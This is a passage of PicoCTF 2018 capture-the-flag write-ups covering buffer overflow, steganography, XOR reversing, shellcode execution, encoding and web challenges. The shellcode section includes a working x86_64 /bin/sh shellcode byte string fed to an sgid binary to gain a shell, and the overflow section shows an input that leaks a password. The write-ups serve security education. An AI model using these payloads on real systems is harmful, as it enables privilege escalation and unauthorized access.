  <span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">end</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="sc">'\x00'</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">strcat</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">",</span><span class="se">\n</span><span class="s">Please Enter the Password."</span><span class="p">);</span>

  <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"password.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">password</span><span class="p">),</span> <span class="n">file</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Hello "</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">password_input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">password_input</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="n">password_input</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">password_input</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'\x00'</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">password_input</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">flag</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Incorrect Password!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>If we overflow the buffer for the <code class="language-plaintext highlighter-rouge">name</code> variable, we can get the flag</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ python -c 'print("a" * 300)' | nc 2018shell1.picoctf.com 31045
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_d98e8d

Incorrect Password!
</pre></table></code></div></div><p>so it output the password for this, we connect again and use the password to get our flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ echo -e 'bla\na_reAllY_s3cuRe_p4s$word_d98e8d' | 2018shell1.picoctf.com 31045
What is your name?
bla
Hello bla,
Please Enter the Password.
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872} </code><hr><h1 id="forensics-200-now-you-don-t"> Forensics 200: now you don’t <a href="/CTF-writeups-public/writeups/PicoCTF_2018/42-forensics-200-now-you-dont.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We heard that there is something hidden in this picture. Can you find it?</p><p><img src="writeupfiles/nowYouDont.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We extract the LSB of each of the colour channels using <a href="https://github.com/shiltemann/CTF-writeups-public/blob/master/_resources/code/stegano/extractlsb.py">this script</a></p><p>and find the flag in the red channel:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 extractlsb.py <span class="nt">-i</span> nowYouDont.png
</pre></table></code></div></div><p>This script outputs 3 black-and-white images, each signifying the least significant bit of each of the 3 RGB channels.</p><p>the outputfile for the red channel, <code class="language-plaintext highlighter-rouge">nowYouDont_lsb_r.png</code>, contained the flag:</p><p><img src="writeupfiles/nowyouseeme.png" alt="" /></p><h2> Flag</h2><code> picoCTF{n0w_y0u_533_m3} </code><hr><h1 id="reversing-200-quackme"> Reversing 200: quackme <a href="/CTF-writeups-public/writeups/PicoCTF_2018/43-reversing-200-quackme.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Can you deal with the Duck Web? Get us the flag from <a href="./writeupfiles/quackme">this program</a><br /> You can also find the program in /problems/quackme_0_29c1eeadf7509d3b370e5d76c6fa54e5.</p><p><strong>Hints</strong><br /> Objdump or something similar is probably a good place to start.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>$ objdump -s -d -j .rodata writeupfiles/quackme

writeupfiles/quackme:     file format elf32-i386

Contents of section .rodata:
 80487e8 03000000 01000200 596f7520 68617665  ........You have
 80487f8 206e6f77 20656e74 65726564 20746865   now entered the
 8048808 20447563 6b205765 622c2061 6e642079   Duck Web, and y
 8048818 6f752772 6520696e 20666f72 20612068  ou're in for a h
 8048828 6f6e6b69 6e272067 6f6f6420 74696d65  onkin' good time
 8048838 2e0a4361 6e20796f 75206669 67757265  ..Can you figure
 8048848 206f7574 206d7920 74726963 6b3f0000   out my trick?..
 8048858 2906164f 2b35301e 511b5b14 4b085d2b  )..O+50.Q.[.K.]+
 8048868 5c100606 18455100 5d004e6f 206c696e  \....EQ.].No lin
 8048878 65207265 61642e2e 2e000000 6d616c6c  e read......mall
 8048888 6f632829 20726574 75726e65 64204e55  oc() returned NU
 8048898 4c4c2e20 4f757420 6f66204d 656d6f72  LL. Out of Memor
 80488a8 790a0059 6f752061 72652077 696e6e65  y..You are winne
 80488b8 72210054 68617427 7320616c 6c20666f  r!.That's all fo
 80488c8 6c6b732e 00                          lks..

Disassembly of section .rodata:

080487e8 &lt;_fp_hw&gt;:
 80487e8:       03 00 00 00                                         ....

080487ec &lt;_IO_stdin_used&gt;:
 80487ec:       01 00 02 00 59 6f 75 20 68 61 76 65 20 6e 6f 77     ....You have now
 80487fc:       20 65 6e 74 65 72 65 64 20 74 68 65 20 44 75 63      entered the Duc
 804880c:       6b 20 57 65 62 2c 20 61 6e 64 20 79 6f 75 27 72     k Web, and you'r
 804881c:       65 20 69 6e 20 66 6f 72 20 61 20 68 6f 6e 6b 69     e in for a honki
 804882c:       6e 27 20 67 6f 6f 64 20 74 69 6d 65 2e 0a 43 61     n' good time..Ca
 804883c:       6e 20 79 6f 75 20 66 69 67 75 72 65 20 6f 75 74     n you figure out
 804884c:       20 6d 79 20 74 72 69 63 6b 3f 00 00                  my trick?..

08048858 &lt;sekrutBuffer&gt;:
 8048858:       29 06 16 4f 2b 35 30 1e 51 1b 5b 14 4b 08 5d 2b     )..O+50.Q.[.K.]+
 8048868:       5c 10 06 06 18 45 51 00 5d 00 4e 6f 20 6c 69 6e     \....EQ.].No lin
 8048878:       65 20 72 65 61 64 2e 2e 2e 00 00 00 6d 61 6c 6c     e read......mall
 8048888:       6f 63 28 29 20 72 65 74 75 72 6e 65 64 20 4e 55     oc() returned NU
 8048898:       4c 4c 2e 20 4f 75 74 20 6f 66 20 4d 65 6d 6f 72     LL. Out of Memor
 80488a8:       79 0a 00 59 6f 75 20 61 72 65 20 77 69 6e 6e 65     y..You are winne
 80488b8:       72 21 00 54 68 61 74 27 73 20 61 6c 6c 20 66 6f     r!.That's all fo
 80488c8:       6c 6b 73 2e 00                                      lks..
</pre></table></code></div></div><p>We see a very suspicious “sekrutBuffer”. We extracted the bytes from this buffer and trying XORing with ‘picoCTF’ in case that shows anything useful:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="err">$</span> <span class="n">python</span>
<span class="n">Python</span> <span class="mf">2.7</span><span class="p">.</span><span class="mi">12</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Dec</span>  <span class="mi">4</span> <span class="mi">2017</span><span class="p">,</span> <span class="mi">14</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">18</span><span class="p">)</span>
<span class="p">[</span><span class="n">GCC</span> <span class="mf">5.4</span><span class="p">.</span><span class="mi">0</span> <span class="mi">20160609</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
<span class="n">Type</span> <span class="sh">"</span><span class="s">help</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">copyright</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">credits</span><span class="sh">"</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">license</span><span class="sh">"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">pico</span> <span class="o">=</span> <span class="nf">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="sh">'</span><span class="s">picoCTF{}</span><span class="sh">'</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="nb">bytes</span><span class="p">,</span> <span class="n">pico</span><span class="p">):</span>
<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">y</span><span class="p">))</span>
<span class="bp">...</span>
<span class="n">Y</span>
<span class="n">o</span>
<span class="n">u</span>

<span class="n">h</span>
<span class="n">a</span>
<span class="n">v</span>
<span class="n">e</span>
<span class="p">,</span>
</pre></table></code></div></div><p>Which looks like the phrase we see provided in the message. We try XORing that phrase against the bytes of the <code class="language-plaintext highlighter-rouge">sekrutBuffer</code> and:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>bytes = [0x29, 0x06, 0x16, 0x4f, 0x2b, 0x35, 0x30, 0x1e, 0x51, 0x1b, 0x5b, 0x14, 0x4b, 0x08, 0x5d, 0x2b, 0x5c, 0x10, 0x06, 0x06, 0x18, 0x45, 0x51, 0x00, 0x5d]
pico = map(ord, "You have now entered the Duck Web, and you're in for a honkin' good time.")

buf = ''
for x, y in zip(bytes, pico):
    buf += chr(x ^ y)

print(''.join(buf))
</pre></table></code></div></div><p>Outputs our flag</p><h2> Flag</h2><code> picoCTF{qu4ckm3_9bcb819e} </code><hr><h1 id="binary-exploitation-200-shellcode"> Binary Exploitation 200: shellcode <a href="/CTF-writeups-public/writeups/PicoCTF_2018/44-binary-exploitation-200-shellcode.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This <a href="writeupfiles/vuln2">program</a> executes any input you give it. Can you get a shell?</p><p>You can find the program in <code class="language-plaintext highlighter-rouge">/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed</code> on the shell server.</p><p><a href="writeupfiles/vuln2.c">Source</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="cp">#define BUFSIZE 148
#define FLAGSIZE 128
</span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="c1">// Set the gid to the effective gid</span>
  <span class="c1">// this prevents /bin/sh from dropping the privileges</span>
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter a string!"</span><span class="p">);</span>
  <span class="n">vuln</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Thanks! Executing now..."</span><span class="p">);</span>

  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">buf</span><span class="p">)();</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This code executes whatever machine instructions we give it.</p><p>We connect to the remote shell and have a look:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed
<span class="nv">$ </span>ll
ll
total 776
drwxr-xr-x   2 root       root          4096 Sep 28 08:11 ./
drwxr-x--x 576 root       root         53248 Sep 30 03:45 ../
<span class="nt">-r--r-----</span>   1 hacksports shellcode_0     34 Sep 28 08:11 flag.txt
<span class="nt">-rwxr-sr-x</span>   1 hacksports shellcode_0 725408 Sep 28 08:11 vuln<span class="k">*</span>
<span class="nt">-rw-rw-r--</span>   1 hacksports hacksports     562 Sep 28 08:11 vuln.c
</pre></table></code></div></div><p>So we want to read the file <code class="language-plaintext highlighter-rouge">flag.txt</code>, but do not have the right permissions.<br /> Because the executable <code class="language-plaintext highlighter-rouge">vuln</code> has the <code class="language-plaintext highlighter-rouge">sgid bit</code> set, we need to get it to<br /> read the contents for us.</p><p>Since the program executes any assembly code we give it, we can make it spawn us a<br /> shell, retaining its escalated permissions, so that we can read the flag. There are<br /> many online collections of such shellcode. We find a shellcode on<br /> <a href="http://shell-storm.org/shellcode/">Shellstorm</a>.</p><p>We first need to find the architecture of the remote machine</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ uname -a
Linux pico-2018-shell-1 4.4.0-1067-aws #77-Ubuntu SMP Mon Aug 27 13:22:03 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
</pre></table></code></div></div><p>Okay, it’s <code class="language-plaintext highlighter-rouge">Linux x86_64</code>. We find a shellcode on shellstorm in that category, we use<br /> <a href="http://shell-storm.org/shellcode/files/shellcode-690.php">this one</a> but any executing<br /> a call to <code class="language-plaintext highlighter-rouge">/bin/sh</code> will do.</p><p>We write the shellcode to a file and then use the following syntax to execute it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ cat ~/shellcode.txt - | ./vuln
</pre></table></code></div></div><p>to keep the shell waiting for stdin or else it will close immediately.</p><p>Here we go:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"print('</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">f
e</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">81')"</span> <span class="o">&gt;</span> ~
/shellcode.txt

<span class="nv">$ </span><span class="nb">cat</span> ~/shellcode.txt - | ./vuln
Enter a string!
1V_ȈF22i0tii0cjo΁
Thanks! Executing now...

<span class="nb">ls
</span>flag.txt  vuln  vuln.c
<span class="nb">cat </span>flag.txt
picoCTF<span class="o">{</span>shellc0de_w00h00_9ee0edd0<span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{shellc0de_w00h00_9ee0edd0} </code><hr><h1 id="general-skills-200-what-base-is-this"> General Skills 200: what base is this? <a href="/CTF-writeups-public/writeups/PicoCTF_2018/45-general-skills-200-what-base-is-this.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To be successful on your mission, you must be able read data represented in different ways, such as hexadecimal or binary. Can you get the flag from this program to prove you are ready? Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 14390</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>we connect and are asked to convert some numbers to ascii:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 14390                                                                                                  <span class="o">[</span>07-10-18 18:39:56]
We are going to start at the very beginning and make sure you understand how data is stored.
turtle
Please give me the 01110100 01110101 01110010 01110100 01101100 01100101 as a word.
To make things interesting, you have 30 seconds.
Input:
turtle
Please give me the 636f756368 as a word.
Input:
couch
Please give me the  154 141 155 160 160 157 163 164 as a word.
Input:
lamppost
You got it! You<span class="s1">'re super quick!
Flag: picoCTF{delusions_about_finding_values_602fd280}
</span></pre></table></code></div></div><h2> Flag</h2><code> picoCTF{delusions_about_finding_values_602fd280} </code><hr><h1 id="general-skills-200-you-can-t-see-me"> General Skills: 200: you can’t see me <a href="/CTF-writeups-public/writeups/PicoCTF_2018/46-general-skills-200-you-cant-see-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> ‘…reading transmission… Y.O.U. .C.A.N.’.T. .S.E.E. .M.E. …transmission ended…’ Maybe something lies in /problems/you-can-t-see-me_4_8bd1412e56df49a3c3757ebeb7ead77f.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>hxr@pico-2018-shell-1:~$ ls -al /problems/you-can-t-see-me_4_8bd1412e56df49a3c3757ebeb7ead77f
total 60
drwxr-xr-x   2 root       root        4096 Sep 28 08:29 .
-rw-rw-r--   1 hacksports hacksports    57 Sep 28 08:29 .
drwxr-x--x 556 root       root       53248 Sep 28 08:29 ..
</pre></table></code></div></div><p>there’s no easy way to access that</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>hxr@pico-2018-shell-1:~$ cat /problems/you-can-t-see-me_4_8bd1412e56df49a3c3757ebeb7ead77f/.*
cat: /problems/you-can-t-see-me_4_8bd1412e56df49a3c3757ebeb7ead77f/.: Is a directory
picoCTF{j0hn_c3na_paparapaaaaaaa_paparapaaaaaa_22f627d9}
cat: /problems/you-can-t-see-me_4_8bd1412e56df49a3c3757ebeb7ead77f/..: Permission denied
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{j0hn_c3na_paparapaaaaaaa_paparapaaaaaa_22f627d9} </code><hr><h1 id="web-exploitation-250-buttons"> Web Exploitation 250: Buttons <a href="/CTF-writeups-public/writeups/PicoCTF_2018/47-web-exploitation-250-buttons.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> There is a website running at http://2018shell1.picoctf.com:21579 (link). Try to see if you can push their buttons.</p><p><strong>Solution</strong><br /> The first button is a form and the second is an <code class="language-plaintext highlighter-rouge">a href</code>. Clicking the second<br /> link gives a message about being denied. Changing the second button to a form<br /> (so it will POST) result in success.</p><h2> Flag</h2><code> picoCTF{button_button_whose_got_the_button_ed306c10} </code><hr><h1 id="forensics-250-ext-super-magic"> Forensics 250: Ext Super Magic <a href="/CTF-writeups-public/writeups/PicoCTF_2018/48-forensics-250-ext-super-magic.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We salvaged a ruined Ext SuperMagic II-class mech recently and pulled the <a href="writeupfiles/ext-super-magic.img">filesystem</a> out of the black box. It looks a bit corrupted, but maybe there’s something interesting in there.</p><p>You can also find it in <code class="language-plaintext highlighter-rouge">/problems/ext-super-magic_4_f196e59a80c3fdac37cc2f331692ef13</code> on the shell server.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code 